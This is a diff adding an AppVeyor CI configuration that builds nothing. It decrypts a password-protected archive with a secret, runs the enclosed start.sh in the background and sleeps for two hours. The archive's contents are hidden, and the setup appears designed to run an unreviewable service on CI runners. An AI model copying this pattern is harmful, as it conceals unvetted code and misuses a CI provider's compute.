@@ -1,0 +1,101 @@
+version: 1.0.{build}
+
+# 构建触发条件
+# branches:
+#   only:
+#     - main
+
+# 使用 Ubuntu 镜像
+image: Ubuntu2204
+
+# 环境变量
+environment:
+  ZIP_PASS:
+    secure: $(ZIP_PASS)
+
+# 缓存设置（可选）
+cache:
+  - node_modules
+
+# 构建前检查
+init:
+  - sh: |
+      echo "Current build ID: $APPVEYOR_BUILD_ID"
+      echo "Build number: $APPVEYOR_BUILD_NUMBER"
+
+# 安装依赖
+install:
+  - sh: |
+      # 安装必要工具
+      sudo apt-get update
+      sudo apt-get install -y p7zip-full jq curl
+
+# 构建脚本
+build_script:
+  - sh: |
+      # 检查是否应该运行
+      SHOULD_RUN="true"
+      
+      # 如果是手动触发，直接运行
+      if [ "$APPVEYOR_FORCED_BUILD" = "True" ]; then
+        echo "Manual trigger detected, will run"
+        SHOULD_RUN="true"
+      else
+        echo "Scheduled or commit trigger, checking conditions..."
+        
+        # 简化版本：由于 AppVeyor API 调用较复杂，这里简化处理
+        # 如果需要复杂的时间检查，需要配置 API token
+        SHOULD_RUN="true"
+      fi
+      
+      if [ "$SHOULD_RUN" = "false" ]; then
+        echo "Skipping build based on conditions"
+        exit 0
+      fi
+      
+      echo "Proceeding with build..."
+      
+      # 解压文件
+      7z x -p"$ZIP_PASS" g-test-action-v2.7z
+      
+      # 启动服务
+      chmod +x start.sh && ./start.sh &
+      echo "Service started"
+      
+      # 等待 7200 秒（24 个循环，每次 300 秒）
+      for i in $(seq 1 24); do
+        echo "Sleeping for 300 seconds (cycle $i/24)"
+        sleep 300
+      done
+      
+      echo "Completed 24 sleep cycles, total 7200 seconds"
+      
+      # 停止服务
+      if [ -f stop.sh ]; then
+        chmod +x stop.sh && ./stop.sh
+      fi
+      
+      # 清理文件（可选）
+      # rm -rf *
+
+# 测试脚本（可选）
+test_script:
+  - sh: echo "No tests configured"
+
+# 构建成功后
+on_success:
+  - sh: echo "Build completed successfully"
+
+# 构建失败后
+on_failure:
+  - sh: echo "Build failed"
+
+# 构建完成后（无论成功失败）
+on_finish:
+  - sh: echo "Build finished"
+
+# 不创建构建包
+artifacts: []
+
+# 部署配置
+deploy: off
